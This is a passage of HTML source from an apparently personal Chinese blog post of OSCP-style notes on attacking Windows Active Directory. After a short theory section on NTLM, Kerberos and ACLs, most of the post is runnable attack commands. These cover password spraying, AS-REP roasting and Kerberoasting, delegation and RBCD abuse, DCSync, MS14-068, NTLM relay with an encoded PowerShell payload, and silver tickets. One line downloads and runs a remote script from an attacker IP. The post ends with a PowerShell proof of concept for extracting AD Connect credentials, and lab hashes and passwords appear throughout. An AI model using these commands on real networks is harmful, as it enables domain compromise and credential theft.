<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>域渗透操作 | 养猪日记</title>
<meta name=keywords content><meta name=description content="impacket-lookupsid
可获取主机用户名：
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'

筛选用户：
cat u|grep SidTypeUser|awk -F '\' '{ print $2 }'|awk -F ' ' '{ print $1 }'
组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解
同步ntp时间：
sudo ntpdate -s 10.10.10.24
查看是否在域内：
net time /do
一、NTLM协议
1、LM hash算法
简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。
2、NTLM hash算法
简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中
3、NTLM 协议认证
简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。
challenge值：
V1：8B
V2：16B
Net-Ntlm hash:
V1：DES加密算法
V2：HMAC-MD5加密算法
4、攻击方式
基于以上特性，NTLM主要有三种攻击方式：
1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。
2、NET-NTLM Relay，发生在response中。
3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。
二、Kerberos协议
1、基础
①客户端
②服务端，拥有唯一的SPN（服务主体名称）
③认证服务的KDC（密钥分发中心），服务账户为krbtgt。
简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ&amp;AS_REP和TGS_REQ&amp;TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。"><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="域渗透操作"><meta property="og:description" content="impacket-lookupsid
可获取主机用户名：
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'

筛选用户：
cat u|grep SidTypeUser|awk -F '\' '{ print $2 }'|awk -F ' ' '{ print $1 }'
组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解
同步ntp时间：
sudo ntpdate -s 10.10.10.24
查看是否在域内：
net time /do
一、NTLM协议
1、LM hash算法
简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。
2、NTLM hash算法
简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中
3、NTLM 协议认证
简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。
challenge值：
V1：8B
V2：16B
Net-Ntlm hash:
V1：DES加密算法
V2：HMAC-MD5加密算法
4、攻击方式
基于以上特性，NTLM主要有三种攻击方式：
1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。
2、NET-NTLM Relay，发生在response中。
3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。
二、Kerberos协议
1、基础
①客户端
②服务端，拥有唯一的SPN（服务主体名称）
③认证服务的KDC（密钥分发中心），服务账户为krbtgt。
简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ&amp;AS_REP和TGS_REQ&amp;TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。"><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="域渗透操作"><meta name=twitter:description content="impacket-lookupsid
可获取主机用户名：
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'

筛选用户：
cat u|grep SidTypeUser|awk -F '\' '{ print $2 }'|awk -F ' ' '{ print $1 }'
组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解
同步ntp时间：
sudo ntpdate -s 10.10.10.24
查看是否在域内：
net time /do
一、NTLM协议
1、LM hash算法
简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。
2、NTLM hash算法
简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中
3、NTLM 协议认证
简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。
challenge值：
V1：8B
V2：16B
Net-Ntlm hash:
V1：DES加密算法
V2：HMAC-MD5加密算法
4、攻击方式
基于以上特性，NTLM主要有三种攻击方式：
1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。
2、NET-NTLM Relay，发生在response中。
3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。
二、Kerberos协议
1、基础
①客户端
②服务端，拥有唯一的SPN（服务主体名称）
③认证服务的KDC（密钥分发中心），服务账户为krbtgt。
简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ&amp;AS_REP和TGS_REQ&amp;TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"域渗透操作","item":"https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"域渗透操作","name":"域渗透操作","description":"impacket-lookupsid 可获取主机用户名：\nimpacket-lookupsid svc_apache:\u0026#39;S@Ss!K@*t13\u0026#39;@\u0026#39;flight.htb\u0026#39; 筛选用户： cat u|grep SidTypeUser|awk -F \u0026#39;\\\u0026#39; \u0026#39;{ print $2 }\u0026#39;|awk -F \u0026#39; \u0026#39; \u0026#39;{ print $1 }\u0026#39; 组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解 同步ntp时间：\nsudo ntpdate -s 10.10.10.24 查看是否在域内：\nnet time /do 一、NTLM协议 1、LM hash算法 简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。\n2、NTLM hash算法 简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中\n3、NTLM 协议认证 简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。\nchallenge值： V1：8B V2：16B Net-Ntlm hash: V1：DES加密算法 V2：HMAC-MD5加密算法\n4、攻击方式 基于以上特性，NTLM主要有三种攻击方式： 1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。 2、NET-NTLM Relay，发生在response中。 3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。\n二、Kerberos协议 1、基础 ①客户端 ②服务端，拥有唯一的SPN（服务主体名称） ③认证服务的KDC（密钥分发中心），服务账户为krbtgt。\n简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ\u0026amp;AS_REP和TGS_REQ\u0026amp;TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。\n","keywords":[],"articleBody":"impacket-lookupsid 可获取主机用户名：\nimpacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb' 筛选用户： cat u|grep SidTypeUser|awk -F '\\' '{ print $2 }'|awk -F ' ' '{ print $1 }' 组合拳：winpeass+mimikatz+信息检索+linuxpeass+枚举服务+暴力破解 同步ntp时间：\nsudo ntpdate -s 10.10.10.24 查看是否在域内：\nnet time /do 一、NTLM协议 1、LM hash算法 简要：采用DES加密，容易被破解，明文长度最长为14，windows vista和windows server 2008后，默认禁用。\n2、NTLM hash算法 简要：为了解决LM hash的问题而引入，使用MD4散列算法，存放在SAM文件中\n3、NTLM 协议认证 简要：基于挑战响应的验证机制，分为Negotiate 协商、challenge 质询、Authentication 认证三步，存在两个版本 V1和V2，目前使用较多的为V2，区别为challenge值和算法不同。\nchallenge值： V1：8B V2：16B Net-Ntlm hash: V1：DES加密算法 V2：HMAC-MD5加密算法\n4、攻击方式 基于以上特性，NTLM主要有三种攻击方式： 1、PTH，由于整个认证过程中都是使用NTLM hash来进行认证，只需要拿到NTLM hash即可通过135/445进行横向移动。 2、NET-NTLM Relay，发生在response中。 3、Net-NTLM v1 hash 破解，由于设计缺陷，获得hash即可破解，可使用打印机漏洞等方式获取。\n二、Kerberos协议 1、基础 ①客户端 ②服务端，拥有唯一的SPN（服务主体名称） ③认证服务的KDC（密钥分发中心），服务账户为krbtgt。\n简要：使用TCP/UDP 88进行认证，TCP/UDP 464进行密码重置，两个基础认证模块：AS_REQ\u0026AS_REP和TGS_REQ\u0026TGS_REP，以及两个扩展模块:S4U（分为S4u2Self和S4u2Proxy）和PAC。\n2、PAC 简要：微软引入进行权限鉴别的东西，正常的Kerberos流程中，TGT和ST均带有PAC。这部分内容可以伪造，但是具有签名，使用服务端或者KDC密钥进行签名，如果有服务端密钥就可以伪造，但是如果开启了KDC校验，就无法伪造。（白银票据的防御）\n3、认证流程 4、攻击方式 密码喷洒： 在AS_REQ请求包中的cname字段，用户名存在与否，密码正确与否，KDC返回内容不一样导致。\nAS-REP Roasting 如果没有进行预认证，在AS_REP中返回的内容由用户hash加密，如果能破解成功，那么就可以获取到用户明文密码。\nKerberoasting 在TGS-REP阶段中，返回的内容由服务的hash加密，如果能破解成功，那么就可以获取到用户明文密码，理论上可以获取到krbtgt用户的密码，但是这个服务账户的密码是随机的，爆破不出来。\n三、LDAP协议 简要：树状图，用来标记活动目录中的对象\n四、组策略 简要：一种域内管理手段，简单理解为脚本。GPT是具体的配置模板，通常位于域控的%systemroot%\\sysvol\\域名、Policies文件夹内，任何用户均可访问，\n攻击方式： 1、组策略首选项，如有批量密码修改的情况，密码采用AES-256加密，但是微软公布了密钥，导致可以解密里面存放的密码。 2、滥用的委派情况，如果委派了某个用户对组策略的修改，可用来造成权限维持。 3、定时任务\n五、ACL 访问控制列表 SP：安全主体，可以通过系统进行身份鉴别的任何实体，例如：用户账户、计算机账户、进程、线程等。 SID：安全标识符，标识安全主体的东西，控制身份鉴别，相关权限的东西。 访问控制模型： 1、访问令牌，包含各种SID，用户的、组的、所有者的等等； 2、安全描述符，创建的安全对象会分配相关的安全信息，包括各种控制信息。\n渗透手法 1、域内用户枚举 适用场景：\n可在域外进行，无域内用户的场景下进行；\n利用工具：\nkerbrute pyKerbrute msf\n../kerbrute_linux_386 userenum --dc 10.10.11.129 -d search.htb user.txt -v 2、密码喷洒 适用场景：\n可在域外进行，但是要注意密码策略，如果有域内用户，可通过Adinfo_darwin查询域内账户策略，防止被封。\n(如果有账户，可以查询域内的其他用户进行喷洒，如果没有，就要配合枚举进行强行喷洒)\n利用工具：\nkerbrute\n../kerbrute_linux_amd64 passwordspray --dc 10.10.10.248 -d intelligence.htb /usr/share/wordlists/john.lst 'NewIntelligenceCorpUser9876' pyKerbrute DomainPassword Spray.ps1\nhttps://github.com/dafthack/DomainPasswordSpray powershell -exec bypass Import-Module .\\DomainPasswordSpray.ps1 Invoke-DomainPasswordSpray -Password 密码 .\\Rubeus.exe brute /passwords: /outfile:\n小技巧：\n通过crackmapexec来获取密码策略，2016下\ncrackmapexec smb ip --pass-pol -u '' -p '' 或者域内主机： net accounts 3、AS-REP Roasting 适用场景：\n目标用户账户设置不进行预身份验证，但是该选项默认不开启，也就是说这个攻击默认配置是无法进行的。同时需要在域内主机或者拥有域内用户账户的情况下进行。\n(有用户名，可以在域外直接打)\n利用工具：\nRubeus （自动搜索可攻击的账户，并保存为john可爆破的格式，在域内主机上执行） ASREPRoast.ps1 (域内主机执行，自动搜索可攻击的账户，需要使用select进行筛选，john可爆破格式) Adfind+impacket GetNPUsers.py(可在域外执行，但是得有可用用户密码，使用Adfind筛选账户，使用GetNPUsers.py获取hash)\n一、域外打法： 获取账户： ① 匿名LDAP登录使用： ldapsearch -x -H ldap://10.10.10.161:389 -u '' -w '' -b \"DC=htb,DC=local\" \"(\u0026(objectCategory=person)(objectClass=user))\" |grep dn 筛选AWK语句： ②有身份信息使用adfinder:(方便很多) 或者cme 获取john hash python ../impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile username.txt -format john htb.local/ 有身份信息： GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete 破解 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 二、域内打法： https://github.com/r3motecontrol/Ghostpack-CompiledBinaries .\\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast Rubeus 梭哈，自动化 https://github.com/HarmJ0y/ASREPRoast ASREPRoast.ps1 梭哈，自动化 Import-Module .\\ASREPRoast.ps1 Invoke-ASREPRoast 4、kerberoasting 适用场景：（有一个普通权限就可以尝试）\n1、拥有一个合法用户密码；2、域内有注册于域用户下的SPN\n利用方法：\n1、获取滥用的SPN：\nRiskySPN：域内主机，该工具可自动过滤出可用的SPN GetUSerSPNS：域内主机，该工具会列出所有注册于用户名下的SPN powerview.ps1：域内主机，该工具会列出所有注册于用户名下的SPN\n2、请求服务票据：\nimpacket GetuserSPNs.py：域外主机，使用账号密码，该工具可以跳过第一步，输出内容为hashcat可爆破内容。\nRubeus：域内主机，该工具可以跳过第一步，输出内容为hashcat或者john可爆破内容. mimikatz：域内主机，挨个请求，保存在内存中\n3、使用上述工具输出的内容破解，或者使用mimikatz、empire导出票据破解\n4、破解工具 kerberoast：可用于破解mimikatz导出的.kirbi格式的票据爆破 tgscrack：.kirbi格式转换后破解 hashcat：破解\n操作\n域外主机，有账密打域内： 获取滥用的SPN： python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 获取ST，保存为hashcat能爆破的格式： python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt 爆破： hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force 域内主机： 1、 .\\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.asreproast 2、 https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1 iex(new-object net.webclient).downloadString('http://192.168.49.211:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat hashcat -m 13100 --force -a 0 svc_mssql.kerberoast /usr/share/wordlists/rockyou.txt 5、委派 非约束性委派打法： **场景：拿到具有委派的服务账户（bloodhound可查）\n相关主机账户和服务账户：userAccountControl 会包含 TRUSTED_FOR_DELEGATION 字段，域控默认非约束性委派。\n使用mimikatz抓取即可，TGT，访问目标什么权限，就可以获得什么权限。\n非约束委派在实战遇到较少，一般都是打印机强制认证，利用也不稳定。\n需要非约束委派主机控制权\n约束委派打法： **场景：拿到具有委派的服务账户（bloodhound可查）\n主机账号或者服务账号被设置为约束委派时， userAccountControl 会包含RUSTED_TO_AUTHENTICATE_FOR_DELEGATION 字段，有msDS-AllowedToDelegateTo字段，里面包含了允许委派的服务\n利用条件为： 1、知道设置约束性委派的用户名和密码（或者Hash） （通常为当前立足点） 2、知道设置约束性委派设置的委派目标的SPN （通常为横向目标主机）\n就可以获取到委派目标的权限，通常为管理员。\n利用方式：\nhash方式： python ../impacket/examples/getST.py -dc-ip 10.10.10.248 （域名/机器账户，不用加$）intelligence.htb/svc_int -hashes :e0dcda8d93bf71a6352ea7803c8f17f1 -spn (可以为委派的spn)www/DC.intelligence.htb -impersonate 'administrator' 账密： python ../impacket/examples/getST.py -dc-ip 10.10.10.248 （域名/机器账户，不用加$）intelligence.htb/svc_int：password -spn (可以为委派的spn)www/DC.intelligence.htb -impersonate 'administrator' 基于资源的约束委派打法 **场景：拿到具有委派的服务账户（bloodhound可查，不一定明说，DC的完全控制权可以，可看hacktricks）\n当拿到的主机具备以下权限时可以考虑：\n默认情况下以下账户拥有修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的权限：\nDomain Admins(域管理员)\nmS-DS-CreatorSID(将该机器加入域的账户)\nNT AUTHORITY\\SELF(机器账户本身）\n在假设获取到了域内普通用户的情况下：\n攻击步骤：\n1、查看当前用户对应的域内机器； 2、创建机器用户； 3、由于当前用户对加入域内的主机拥有配置基于RBCD的权限，所以配置RBCD； 4、使用新建的机器账 户，就可以获取到目标域内机器的最高权限。\n域内主机，域外参考sxf域渗透打法：\n一、导入模块： Import-Module ./Powermad.ps1 或者 . ./Powermad.ps1 二、添加机器账户，基于资源的约束型委派需要： Set-Variable -Name \"FakePC\" -Value \"FAKE01\" # FAKE01这个名字可以自己改 Set-Variable -Name \"targetComputer\" -Value \"DC\" New-MachineAccount -MachineAccount (Get-Variable -Name \"FakePC\").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose 三、设置权限 Set-ADComputer (Get-Variable -Name \"targetComputer\").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name \"FakePC\").Value + '$') 四、生成hash ./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb 五、利用hash申请票据 添加hosts文件 echo \"10.10.11.174 support.htb\" \u003e\u003e /etc/hosts echo \"10.10.11.174 dc.support.htb\" \u003e\u003e /etc/hosts 生成TGT票据，以administrator的身份申请一张访问http/dc.support.htb服务的票据 python3 getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B 六、连接 添加票据，如果失败，添加dns解析 export KRB5CCNAME=administrator.ccache smbexec.py support.htb/administrator@dc.support.htb -no-pass -k 方法二： impacket-addcomputer -computer-name \"machine19\" -computer-pass \"P@ssw0rd\" -dc-ip 192.168.180.175 -method SAMR -debug resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 impacket-rbcd -delegate-from machine19$ -delegate-to RESOURCEDC$ -dc-ip 192.168.180.175 -action write resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 impacket-getST resourced.local/'machine18$':'P@ssw0rd' -spn cifs/RESOURCEDC.resourced.local -impersonate administrator 后面第六步一样 总结条件： 1、攻击者拥有(将该机器加入域的账户、机器本身、管理员）身份之一，多数为前两者。 2、存在相关主机（也就是横向 or 提权目标）\n应用场景为：提权、有其他主机被当前用户拉入域内的横向移动。\nkerberos Bronze Bit（打委派的时候记得尝试） 这个漏洞可以绕过不允许委派的敏感账户进行委派，getst.py后加上-force-forwardable参数即可\n6、DCSYNC 利用域控的复制，获取所有账号密码\n7、PTH PTH存在限制，默认情况下，由于UAC的存在，只有本地管理员和域管理员组用户可以直接PTH。\n8、域内漏洞 1、MS14-068\n梭哈，域内普通用户主机直接打域控\n方案一：impacket apt-get install krb5-user -y python ../impacket/examples/goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 htb.local/james:'J@m3s_P@ssW0rd!'@MANTIS.htb.local 报错解决方案 https://note.f5.pm/go-37050.html 方案二： Metasploit 方案三： PyKEK 工具包 当前kali环境没成功过 2、zerologon\n梭哈，域外直接打域控，走135端口\n3、windows print spooler\n域内普通用户，上线CS\n4、ADCS 证书攻击\n2021年进入人们视野，在域中可以使用证书进行身份认证，身份鉴别在于私钥，拥有私钥甚至可以用作权限维持，总是可以获取到最新的NTLM hash。\n但是不是所有的证书都可以用来进行身份认证，只有部分配置了特殊权限的证书可以。\nCertify.git https://github.com/ademkanat/Certify.git\nCVE-2022-26923 该漏洞便是因为机器账户，可以申请域控的证书，导致的普通用户提权到域管。\ncertipy攻击\nCVE-2021-42287 该漏洞和上述漏洞较为相似，但是攻击链更为复杂，同样是需要一个有效用户。\n可梭哈\n错误的ADCS模板配置：\nExchange 两条攻击链，均可梭哈\n9、中继 这种方式其实叫做认证：\nsudo responder -i 10.10.16.3 -I tun0 抓到的hash需要破解，装进txt，使用john --wordlist=xxx hash.txt 或者：hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force 中继： ntlmrelayx\nimpacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c \"powershell -enc JABjAGwAaQBlAG4AdA...\" dir \\192.168.45.168\\test\n10、白银票据 特殊情况下获得服务的密码以及sid和spn，可以尝试：\nntlm hash生成网站： https://www.browserling.com/tools/ntlm-hash 需要：sid\\spn: python ../impacket/examples/ticketer.py -domain-sid S-1-5-21-2743207045-1827831105-2542523200-502 -spn MSSQLSvc/dc1.scrm.local -nthash B999A16500B87D17EC7F2E2A68778F05 -domain scrm.local administrator mimikatz: kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin 几个横向工具 1、psexec 通过创建服务和上传二进制程序getshell，日志记录明显，且容易被杀。\n条件：445端口，IPC$开启，非IPC$开启（这几个条件默认满足）\n2、smbexec 通过创建服务和bat的形式执行命令，通过读取txt来获取回显，日志更为明显，defender拦截。\n条件：445端口，IPC$开启，非IPC$开启（这几个条件默认满足）\n3、wmiexec 通过wmi来实现命令执行，躲避杀软效果较好，445获取回显\n条件：135、445端口，admin$开启（默认满足）\n4、atexec 通过计划任务实现At exec的主要特点是通过135端口进行计划任务的创建，同时通过445端口进行SMB认证\n条件：135、445（默认满足）\n5、dcomexec 通过dcom在目标执行命令\n条件：135、445\nBloodhound Import-Module ./SharpHound.ps1 Invoke-BloodHound -c all 如果遇到无法上传，尝试使用1.1版本，甚至更低的1.0.3 https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip bloodhound.py https://github.com/dirkjanm/BloodHound.py python3 bloodhound.py -d 域名 -u 用户 -p 密码 -ns 域控IP -dc 域控主机名 -c all --zip bloodhound.py-kerberos git clone https://github.com/jazzpizazz/BloodHound.py-Kerberos sudo ntpdate -s 10.10.11.181 python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!' -dc-ip 10.10.11.181 export KRB5CCNAME=./m.lovegod.ccache python3 BloodHound.py-Kerberos/bloodhound.py -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --dns-tcp --zip -c All -no-pass Impacket工具包： dacl的连接： https://github.com/ShutdownRepo/impacket/tree/dacledit 域外添加账户权限，kerberos情况下： 同步时间： sudo ntpdate -s 10.10.11.181 申请票据： python3 impacket-dacledit/examples/getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!' -dc-ip 10.10.11.181 添加环境变量： export KRB5CCNAME=m.lovegod.ccache 使用： python3 impacket-dacledit/examples/dacledit.py -action 'write' -rights 'WriteMembers' -principal 'm.lovegod' -target-dn 'CN=NETWORK AUDIT,CN=USERS,DC=ABSOLUTE,DC=HTB' -k -no-pass -u absolute.htb/m.lovegod -dc-ip 10.10.11.181 Impacket v0.12.0.dev1+20240116.639.82267d84 - Copyright 2021 SecureAuth Corporation 域外添加DCSYNC权限： python dacledit.py -action 'write' -rights 'FullControl' -principal 'cxk' -target-dn 'DC=HTB,DC=LOCAL' 'HTB.LOCAL'/'cxk':'cxk123!' -dc-ip 10.10.10.161 DCSYNC获取hash: python secretsdump.py HTB.LOCAL/cxk:'cxk123!'@10.10.10.161 mimikatz 非交互式运行： mimikatz.exe dpapi::firefox mimikatz.exe lsadump::dcsync /domain:scrm.local /all /csv 主机密码获取 浏览器等： https://github.com/AlessandroZ/LaZagne ReadLAPSPassword https://github.com/p0dalirius/pyLAPS 查询密码： python pyLAPS.py --action get -u 'JDgodd' -d 'streamio.htb' -p 'JDg0dd1s@d0p3cr3@t0r' --dc-ip 10.10.11.158 writeowner 权限： 修改用户所有者： python owneredit.py -action write -new-owner 'JDgodd' -target 'CORE STAFF' 'STREAMIO.HTB'/'JDgodd':'JDg0dd1s@d0p3cr3@t0r' 修改DACL权限： 具体情况具体分析，主要是看这个组有什么权限,最好是完全控制权限：FullControl 授予JDgodd向CORE STAFF组添加用户的权限： dacledit.py -action 'write' -rights 'WriteMembers' -principal 'JDgodd' -target-dn 'CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB' 'STREAMIO.HTB'/'JDgodd':'JDg0dd1s@d0p3cr3@t0r' 把自己添加到CORE STAFF组内： net rpc group addmem \"CORE STAFF\" \"JDgodd\" -U \"STREAMIO.HTB\"/\"JDgodd\"%\"JDg0dd1s@d0p3cr3@t0r\" -S \"dc.STREAMIO.HTB\" AD Recycle Bin组 查看已经删除了的用户： Get-ADObject -filter 'isDeleted -eq $true -and name -ne \"Deleted Objects\"' -includeDeletedObjects 获取该用户的详细信息： Get-ADObject -filter { SAMAccountName -eq \"TempAdmin\" } -includeDeletedObjects -property * 添加dns记录 https://github.com/4ndr34z/krbrelayx.git 添加主机dns记录： python dnstool.py -u 'intelligence\\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.16.18 -t A ReadGMSAPassword权限 python gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' ReadLAPSPassword https://github.com/p0dalirius/pyLAPS python pyLAPS.py --action get -d \"hutch.offsec\" -u \"fmcSorley\" -p \"CrabSharkJellyfish192\" --dc-ip 192.168.224.122 默认获取为administrator密码 Azure AD (AAD) Sync service攻击 查询注册表，服务路径： Get-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync 通过路径确定版本： Get-ItemProperty -Path \"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\miiserver.exe\"|Format-list -Property * -Force 从数据库中提取信息： sqlcmd -S MONTEVERDE -Q \"use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration\" poc: Function Get-ADConnectPassword{ Write-Host \"AD Connect Sync Credential Extract POC (@_xpn_)`n\" $key_id = 1 $instance_id = [GUID]\"1852B527-DD4F-4ECF-B541-EFCCBFF29E31\"(修改) $entropy = [GUID]\"194EC2FC-F186-46CF-B44D-071EB61F49CD\"（修改） $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \"Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true\" $client.Open() $cmd = $client.CreateCommand() $cmd.CommandText = \"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'\" $reader = $cmd.ExecuteReader() $reader.Read() | Out-Null $config = $reader.GetString(0) $crypted = $reader.GetString(1) $reader.Close() add-type -path 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll' $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager $km.LoadKeySet($entropy, $instance_id, $key_id) $key = $null $km.GetActiveCredentialKey([ref]$key) $key2 = $null $km.GetKey(1, [ref]$key2) $decrypted = $null $key2.DecryptBase64ToString($crypted, [ref]$decrypted) $domain = select-xml -Content $config -XPath 